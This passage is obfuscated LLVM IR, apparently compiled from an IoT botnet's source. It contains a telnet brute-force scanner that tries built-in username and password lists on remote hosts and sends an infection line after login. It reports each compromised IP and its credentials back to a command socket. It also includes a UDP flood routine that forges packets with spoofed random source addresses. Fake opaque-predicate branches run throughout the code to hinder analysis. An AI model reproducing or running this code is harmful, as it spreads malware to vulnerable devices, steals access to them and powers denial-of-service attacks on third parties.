  %1641 = load i32, i32* %1640, align 16
  %1642 = load i32, i32* %2, align 4
  %1643 = sext i32 %1642 to i64
  %1644 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1643
  %1645 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1644, i32 0, i32 4
  %1646 = load i8, i8* %1645, align 2
  %1647 = zext i8 %1646 to i64
  %1648 = getelementptr inbounds [19 x i8*], [19 x i8*]* @usernames, i64 0, i64 %1647
  %1649 = load i8*, i8** %1648, align 8
  %1650 = load i32, i32* %2, align 4
  %1651 = sext i32 %1650 to i64
  %1652 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1651
  %1653 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1652, i32 0, i32 4
  %1654 = load i8, i8* %1653, align 2
  %1655 = zext i8 %1654 to i64
  %1656 = getelementptr inbounds [19 x i8*], [19 x i8*]* @usernames, i64 0, i64 %1655
  %1657 = load i8*, i8** %1656, align 8
  %1658 = call i64 @strlen(i8* %1657) #10
  %1659 = call i64 @send(i32 %1641, i8* %1649, i64 %1658, i32 16384)
  %1660 = icmp slt i64 %1659, 0
  br label %originalBB59

originalBB63alteredBB:                            ; preds = %originalBB63, %737
  %1661 = load i32, i32* %2, align 4
  %1662 = sext i32 %1661 to i64
  %1663 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1662
  %1664 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1663, i32 0, i32 0
  %1665 = load i32, i32* %1664, align 16
  %1666 = call i32 @sclose(i32 %1665)
  %1667 = load i32, i32* %2, align 4
  %1668 = sext i32 %1667 to i64
  %1669 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1668
  %1670 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1669, i32 0, i32 2
  store i8 0, i8* %1670, align 8
  %1671 = load i32, i32* %2, align 4
  %1672 = sext i32 %1671 to i64
  %1673 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1672
  %1674 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1673, i32 0, i32 3
  store i8 1, i8* %1674, align 1
  br label %originalBB63

originalBB67alteredBB:                            ; preds = %originalBB67, %768
  %1675 = load i32, i32* %2, align 4
  %1676 = sext i32 %1675 to i64
  %1677 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1676
  %1678 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1677, i32 0, i32 0
  %1679 = load i32, i32* %1678, align 16
  %1680 = call i64 @send(i32 %1679, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i32 0, i32 0), i64 2, i32 16384)
  %1681 = icmp slt i64 %1680, 0
  br label %originalBB67

originalBB71alteredBB:                            ; preds = %originalBB71, %825
  %1682 = load i32, i32* %2, align 4
  %1683 = sext i32 %1682 to i64
  %1684 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1683
  %1685 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1684, i32 0, i32 0
  %1686 = load i32, i32* %1685, align 16
  %1687 = load i32, i32* %2, align 4
  %1688 = sext i32 %1687 to i64
  %1689 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1688
  %1690 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1689, i32 0, i32 8
  %1691 = load i8*, i8** %1690, align 8
  %1692 = load i32, i32* %2, align 4
  %1693 = sext i32 %1692 to i64
  %1694 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1693
  %1695 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1694, i32 0, i32 7
  %1696 = load i16, i16* %1695, align 16
  %1697 = zext i16 %1696 to i32
  %1698 = call i32 @readUntil(i32 %1686, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.76, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1691, i32 1024, i32 %1697)
  %1699 = icmp ne i32 %1698, 0
  br label %originalBB71

originalBB75alteredBB:                            ; preds = %originalBB75, %907
  %1700 = load i32, i32* %2, align 4
  %1701 = sext i32 %1700 to i64
  %1702 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1701
  %1703 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1702, i32 0, i32 2
  store i8 7, i8* %1703, align 8
  br label %originalBB75

originalBB79alteredBB:                            ; preds = %originalBB79, %928
  %1704 = load i32, i32* %2, align 4
  %1705 = sext i32 %1704 to i64
  %1706 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1705
  %1707 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1706, i32 0, i32 8
  %1708 = load i8*, i8** %1707, align 8
  call void @llvm.memset.p0i8.i64(i8* %1708, i8 0, i64 1024, i32 1, i1 false)
  br label %originalBB79

originalBB83alteredBB:                            ; preds = %originalBB83, %950
  %1709 = load i32, i32* %2, align 4
  %1710 = sext i32 %1709 to i64
  %1711 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1710
  %1712 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1711, i32 0, i32 8
  %1713 = load i8*, i8** %1712, align 8
  %1714 = call i8* @strstr(i8* %1713, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.78, i32 0, i32 0)) #10
  %1715 = icmp ne i8* %1714, null
  br label %originalBB83

originalBB87alteredBB:                            ; preds = %originalBB87, %1010
  %1716 = load i32, i32* %2, align 4
  %1717 = sext i32 %1716 to i64
  %1718 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1717
  %1719 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1718, i32 0, i32 0
  %1720 = load i32, i32* %1719, align 16
  %1721 = call i32 @sclose(i32 %1720)
  %1722 = load i32, i32* %2, align 4
  %1723 = sext i32 %1722 to i64
  %1724 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1723
  %1725 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1724, i32 0, i32 2
  store i8 0, i8* %1725, align 8
  %1726 = load i32, i32* %2, align 4
  %1727 = sext i32 %1726 to i64
  %1728 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1727
  %1729 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1728, i32 0, i32 3
  store i8 1, i8* %1729, align 1
  br label %originalBB87

originalBB91alteredBB:                            ; preds = %originalBB91, %1042
  %1730 = load i32, i32* %2, align 4
  %1731 = sext i32 %1730 to i64
  %1732 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1731
  %1733 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1732, i32 0, i32 0
  %1734 = load i32, i32* %1733, align 16
  %1735 = load i32, i32* %2, align 4
  %1736 = sext i32 %1735 to i64
  %1737 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1736
  %1738 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1737, i32 0, i32 5
  %1739 = load i8, i8* %1738, align 1
  %1740 = zext i8 %1739 to i64
  %1741 = getelementptr inbounds [26 x i8*], [26 x i8*]* @passwords, i64 0, i64 %1740
  %1742 = load i8*, i8** %1741, align 8
  %1743 = load i32, i32* %2, align 4
  %1744 = sext i32 %1743 to i64
  %1745 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1744
  %1746 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1745, i32 0, i32 5
  %1747 = load i8, i8* %1746, align 1
  %1748 = zext i8 %1747 to i64
  %1749 = getelementptr inbounds [26 x i8*], [26 x i8*]* @passwords, i64 0, i64 %1748
  %1750 = load i8*, i8** %1749, align 8
  %1751 = call i64 @strlen(i8* %1750) #10
  %1752 = call i64 @send(i32 %1734, i8* %1742, i64 %1751, i32 16384)
  %1753 = icmp slt i64 %1752, 0
  br label %originalBB91

originalBB95alteredBB:                            ; preds = %originalBB95, %1083
  %1754 = load i32, i32* %2, align 4
  %1755 = sext i32 %1754 to i64
  %1756 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1755
  %1757 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1756, i32 0, i32 0
  %1758 = load i32, i32* %1757, align 16
  %1759 = call i32 @sclose(i32 %1758)
  %1760 = load i32, i32* %2, align 4
  %1761 = sext i32 %1760 to i64
  %1762 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1761
  %1763 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1762, i32 0, i32 2
  store i8 0, i8* %1763, align 8
  %1764 = load i32, i32* %2, align 4
  %1765 = sext i32 %1764 to i64
  %1766 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1765
  %1767 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1766, i32 0, i32 3
  store i8 1, i8* %1767, align 1
  br label %originalBB95

originalBB99alteredBB:                            ; preds = %originalBB99, %1114
  %1768 = load i32, i32* %2, align 4
  %1769 = sext i32 %1768 to i64
  %1770 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1769
  %1771 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1770, i32 0, i32 0
  %1772 = load i32, i32* %1771, align 16
  %1773 = call i64 @send(i32 %1772, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i32 0, i32 0), i64 2, i32 16384)
  %1774 = icmp slt i64 %1773, 0
  br label %originalBB99

originalBB103alteredBB:                           ; preds = %originalBB103, %1265
  %1775 = load i32, i32* %2, align 4
  %1776 = sext i32 %1775 to i64
  %1777 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1776
  %1778 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1777, i32 0, i32 8
  %1779 = load i8*, i8** %1778, align 8
  %1780 = call i64 @strlen(i8* %1779) #10
  %1781 = trunc i64 %1780 to i16
  %1782 = load i32, i32* %2, align 4
  %1783 = sext i32 %1782 to i64
  %1784 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1783
  %1785 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1784, i32 0, i32 7
  store i16 %1781, i16* %1785, align 16
  br label %originalBB103

originalBB107alteredBB:                           ; preds = %originalBB107, %1302
  %1786 = load i32, i32* %2, align 4
  %1787 = sext i32 %1786 to i64
  %1788 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1787
  %1789 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1788, i32 0, i32 0
  %1790 = load i32, i32* %1789, align 16
  %1791 = call i32 @sclose(i32 %1790)
  %1792 = load i32, i32* %2, align 4
  %1793 = sext i32 %1792 to i64
  %1794 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1793
  %1795 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1794, i32 0, i32 2
  store i8 0, i8* %1795, align 8
  %1796 = load i32, i32* %2, align 4
  %1797 = sext i32 %1796 to i64
  %1798 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1797
  %1799 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1798, i32 0, i32 3
  store i8 1, i8* %1799, align 1
  br label %originalBB107

originalBB111alteredBB:                           ; preds = %originalBB111, %1342
  %1800 = load i32, i32* %2, align 4
  %1801 = sext i32 %1800 to i64
  %1802 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1801
  %1803 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1802, i32 0, i32 0
  %1804 = load i32, i32* %1803, align 16
  %1805 = call i32 @sclose(i32 %1804)
  %1806 = load i32, i32* %2, align 4
  %1807 = sext i32 %1806 to i64
  %1808 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1807
  %1809 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1808, i32 0, i32 2
  store i8 0, i8* %1809, align 8
  %1810 = load i32, i32* %2, align 4
  %1811 = sext i32 %1810 to i64
  %1812 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1811
  %1813 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1812, i32 0, i32 3
  store i8 1, i8* %1813, align 1
  br label %originalBB111

originalBB115alteredBB:                           ; preds = %originalBB115, %1391
  %1814 = load i32, i32* %2, align 4
  %1815 = sext i32 %1814 to i64
  %1816 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1815
  %1817 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1816, i32 0, i32 0
  %1818 = load i32, i32* %1817, align 16
  %1819 = load i8*, i8** @infectline, align 8
  %1820 = load i8*, i8** @infectline, align 8
  %1821 = call i64 @strlen(i8* %1820) #10
  %1822 = call i64 @send(i32 %1818, i8* %1819, i64 %1821, i32 16384)
  %1823 = icmp slt i64 %1822, 0
  br label %originalBB115

originalBB119alteredBB:                           ; preds = %originalBB119, %1438
  %1824 = load i32, i32* @mainCommSock, align 4
  %1825 = load i32, i32* %2, align 4
  %1826 = sext i32 %1825 to i64
  %1827 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1826
  %1828 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1827, i32 0, i32 1
  %1829 = bitcast i32* %1828 to %struct.in_addr*
  %1830 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1829, i32 0, i32 0
  %1831 = load i32, i32* %1830, align 4
  %1832 = call i8* @inet_ntoa(i32 %1831) #2
  %1833 = load i32, i32* %2, align 4
  %1834 = sext i32 %1833 to i64
  %1835 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1834
  %1836 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1835, i32 0, i32 4
  %1837 = load i8, i8* %1836, align 2
  %1838 = zext i8 %1837 to i64
  %1839 = getelementptr inbounds [19 x i8*], [19 x i8*]* @usernames, i64 0, i64 %1838
  %1840 = load i8*, i8** %1839, align 8
  %1841 = load i32, i32* %2, align 4
  %1842 = sext i32 %1841 to i64
  %1843 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1842
  %1844 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1843, i32 0, i32 5
  %1845 = load i8, i8* %1844, align 1
  %1846 = zext i8 %1845 to i64
  %1847 = getelementptr inbounds [26 x i8*], [26 x i8*]* @passwords, i64 0, i64 %1846
  %1848 = load i8*, i8** %1847, align 8
  %1849 = call i32 (i32, i8*, ...) @sockprintf(i32 %1824, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.80, i32 0, i32 0), i8* %1832, i8* %1840, i8* %1848)
  %1850 = load i32, i32* %2, align 4
  %1851 = sext i32 %1850 to i64
  %1852 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1851
  %1853 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1852, i32 0, i32 6
  %1854 = load i32, i32* %1853, align 4
  %_120 = sub i32 0, %1854
  %gen121 = add i32 %_120, 8
  %_122 = shl i32 %1854, 8
  %1855 = add i32 %1854, 8
  %1856 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1857 = icmp ult i32 %1855, %1856
  br label %originalBB119

originalBB126alteredBB:                           ; preds = %originalBB126, %1531
  br label %originalBB126

originalBB130alteredBB:                           ; preds = %originalBB130, %1551
  br label %originalBB130
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #4

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #4

declare i32 @time(...) #3

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #4

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8*, align 8
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = load i32, i32* %8, align 4
  %26 = icmp eq i32 %25, 0
  br i1 %26, label %27, label %31

; <label>:27:                                     ; preds = %6
  %28 = call i32 @rand_cmwc()
  %29 = trunc i32 %28 to i16
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %29, i16* %30, align 2
  br label %52

; <label>:31:                                     ; preds = %6
  %32 = load i32, i32* @x.65
  %33 = load i32, i32* @y.66
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %31
  %40 = load i32, i32* %8, align 4
  %41 = trunc i32 %40 to i16
  %42 = call zeroext i16 @htons(i16 zeroext %41) #13
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %42, i16* %43, align 2
  %44 = load i32, i32* @x.65
  %45 = load i32, i32* @y.66
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %52

; <label>:52:                                     ; preds = %originalBBpart2, %27
  %53 = load i32, i32* @x.65
  %54 = load i32, i32* @y.66
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %52
  %61 = load i8*, i8** %7, align 8
  %62 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %63 = call i32 @getHost(i8* %61, %struct.in_addr* %62)
  %64 = icmp ne i32 %63, 0
  %65 = load i32, i32* @x.65
  %66 = load i32, i32* @y.66
  %67 = sub i32 %65, 1
  %68 = mul i32 %65, %67
  %69 = urem i32 %68, 2
  %70 = icmp eq i32 %69, 0
  %71 = icmp slt i32 %66, 10
  %72 = or i1 %70, %71
  br i1 %72, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %64, label %73, label %90

; <label>:73:                                     ; preds = %originalBBpart24
  %74 = load i32, i32* @x.65
  %75 = load i32, i32* @y.66
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %73
  %82 = load i32, i32* @x.65
  %83 = load i32, i32* @y.66
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %409

; <label>:90:                                     ; preds = %originalBBpart24
  %91 = load i32, i32* @x.65
  %92 = load i32, i32* @y.66
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %90
  %99 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 3
  %100 = getelementptr inbounds [8 x i8], [8 x i8]* %99, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %100, i8 0, i64 8, i32 4, i1 false)
  %101 = load i32, i32* %11, align 4
  store i32 %101, i32* %14, align 4
  %102 = call i32 @socket(i32 2, i32 3, i32 17) #2
  store i32 %102, i32* %15, align 4
  %103 = load i32, i32* %15, align 4
  %104 = icmp ne i32 %103, 0
  %105 = load i32, i32* @x.65
  %106 = load i32, i32* @y.66
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %104, label %114, label %113

; <label>:113:                                    ; preds = %originalBBpart212
  br label %409

; <label>:114:                                    ; preds = %originalBBpart212
  store i32 1, i32* %16, align 4
  %115 = load i32, i32* %15, align 4
  %116 = bitcast i32* %16 to i8*
  %117 = call i32 @setsockopt(i32 %115, i32 0, i32 3, i8* %116, i32 4) #2
  %118 = icmp slt i32 %117, 0
  br i1 %118, label %119, label %120

; <label>:119:                                    ; preds = %114
  br label %409

; <label>:120:                                    ; preds = %114
  %121 = load i32, i32* @x.65
  %122 = load i32, i32* @y.66
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %120
  store i32 50, i32* %17, align 4
  %129 = load i32, i32* @x.65
  %130 = load i32, i32* @y.66
  %131 = sub i32 %129, 1
  %132 = mul i32 %129, %131
  %133 = urem i32 %132, 2
  %134 = icmp eq i32 %133, 0
  %135 = icmp slt i32 %130, 10
  %136 = or i1 %134, %135
  br i1 %136, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %137

; <label>:137:                                    ; preds = %157, %originalBBpart216
  %138 = load i32, i32* @x.65
  %139 = load i32, i32* @y.66
  %140 = sub i32 %138, 1
  %141 = mul i32 %138, %140
  %142 = urem i32 %141, 2
  %143 = icmp eq i32 %142, 0
  %144 = icmp slt i32 %139, 10
  %145 = or i1 %143, %144
  br i1 %145, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %137
  %146 = load i32, i32* %17, align 4
  %147 = add nsw i32 %146, -1
  store i32 %147, i32* %17, align 4
  %148 = icmp ne i32 %146, 0
  %149 = load i32, i32* @x.65
  %150 = load i32, i32* @y.66
  %151 = sub i32 %149, 1
  %152 = mul i32 %149, %151
  %153 = urem i32 %152, 2
  %154 = icmp eq i32 %153, 0
  %155 = icmp slt i32 %150, 10
  %156 = or i1 %154, %155
  br i1 %156, label %originalBBpart227, label %originalBB18alteredBB

originalBBpart227:                                ; preds = %originalBB18
  br i1 %148, label %157, label %162

; <label>:157:                                    ; preds = %originalBBpart227
  %158 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %159 = call i32 @rand_cmwc()
  %160 = xor i32 %158, %159
  call void @srand(i32 %160) #2
  %161 = call i32 @rand() #2
  call void @init_rand(i32 %161)
  br label %137

; <label>:162:                                    ; preds = %originalBBpart227
  %163 = load i32, i32* @x.65
  %164 = load i32, i32* @y.66
  %165 = sub i32 %163, 1
  %166 = mul i32 %163, %165
  %167 = urem i32 %166, 2
  %168 = icmp eq i32 %167, 0
  %169 = icmp slt i32 %164, 10
  %170 = or i1 %168, %169
  br i1 %170, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %162
  %171 = load i32, i32* %12, align 4
  %172 = sub nsw i32 32, %171
  %173 = shl i32 1, %172
  %174 = sub nsw i32 %173, 1
  %175 = xor i32 %174, -1
  store i32 %175, i32* %18, align 4
  %176 = load i32, i32* %10, align 4
  %177 = sext i32 %176 to i64
  %178 = add i64 28, %177
  %179 = call i8* @llvm.stacksave()
  store i8* %179, i8** %19, align 8
  %180 = alloca i8, i64 %178, align 16
  %181 = bitcast i8* %180 to %struct.iphdr*
  store %struct.iphdr* %181, %struct.iphdr** %20, align 8
  %182 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %183 = bitcast %struct.iphdr* %182 to i8*
  %184 = getelementptr i8, i8* %183, i64 20
  %185 = bitcast i8* %184 to %struct.udphdr*
  store %struct.udphdr* %185, %struct.udphdr** %21, align 8
  %186 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %187 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %188 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %187, i32 0, i32 0
  %189 = load i32, i32* %188, align 4
  %190 = load i32, i32* %18, align 4
  %191 = call i32 @getRandomIP(i32 %190)
  %192 = call i32 @htonl(i32 %191) #13
  %193 = load i32, i32* %10, align 4
  %194 = sext i32 %193 to i64
  %195 = add i64 8, %194
  %196 = trunc i64 %195 to i32
  call void @makeIPPacket(%struct.iphdr* %186, i32 %189, i32 %192, i8 zeroext 17, i32 %196)
  %197 = load i32, i32* %10, align 4
  %198 = sext i32 %197 to i64
  %199 = add i64 8, %198
  %200 = trunc i64 %199 to i16
  %201 = call zeroext i16 @htons(i16 zeroext %200) #13
  %202 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %203 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %202, i32 0, i32 0
  %204 = bitcast %union.anon.2* %203 to %struct.anon.3*
  %205 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %204, i32 0, i32 2
  store i16 %201, i16* %205, align 2
  %206 = call i32 @rand_cmwc()
  %207 = trunc i32 %206 to i16
  %208 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %209 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %208, i32 0, i32 0
  %210 = bitcast %union.anon.2* %209 to %struct.anon.3*
  %211 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %210, i32 0, i32 0
  store i16 %207, i16* %211, align 2
  %212 = load i32, i32* %8, align 4
  %213 = icmp eq i32 %212, 0
  %214 = load i32, i32* @x.65
  %215 = load i32, i32* @y.66
  %216 = sub i32 %214, 1
  %217 = mul i32 %214, %216
  %218 = urem i32 %217, 2
  %219 = icmp eq i32 %218, 0
  %220 = icmp slt i32 %215, 10
  %221 = or i1 %219, %220
  br i1 %221, label %originalBBpart281, label %originalBB29alteredBB

originalBBpart281:                                ; preds = %originalBB29
  br i1 %213, label %222, label %224

; <label>:222:                                    ; preds = %originalBBpart281
  %223 = call i32 @rand_cmwc()
  br label %229

; <label>:224:                                    ; preds = %originalBBpart281
  %225 = load i32, i32* %8, align 4
  %226 = trunc i32 %225 to i16
  %227 = call zeroext i16 @htons(i16 zeroext %226) #13
  %228 = zext i16 %227 to i32
  br label %229

; <label>:229:                                    ; preds = %224, %222
  %230 = phi i32 [ %223, %222 ], [ %228, %224 ]
  %231 = trunc i32 %230 to i16
  %232 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %233 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %232, i32 0, i32 0
  %234 = bitcast %union.anon.2* %233 to %struct.anon.3*
  %235 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %234, i32 0, i32 1
  store i16 %231, i16* %235, align 2
  %236 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %237 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %236, i32 0, i32 0
  %238 = bitcast %union.anon.2* %237 to %struct.anon.3*
  %239 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %238, i32 0, i32 3
  store i16 0, i16* %239, align 2
  %240 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %241 = bitcast %struct.udphdr* %240 to i8*
  %242 = getelementptr inbounds i8, i8* %241, i64 8
  %243 = load i32, i32* %10, align 4
  call void @makeRandomStr(i8* %242, i32 %243)
  %244 = bitcast i8* %180 to i16*
  %245 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %246 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %245, i32 0, i32 2
  %247 = load i16, i16* %246, align 2
  %248 = zext i16 %247 to i32
  %249 = call zeroext i16 @csum(i16* %244, i32 %248)
  %250 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %251 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %250, i32 0, i32 7
  store i16 %249, i16* %251, align 2
  %252 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %253 = load i32, i32* %9, align 4
  %254 = add nsw i32 %252, %253
  store i32 %254, i32* %22, align 4
  store i32 0, i32* %23, align 4
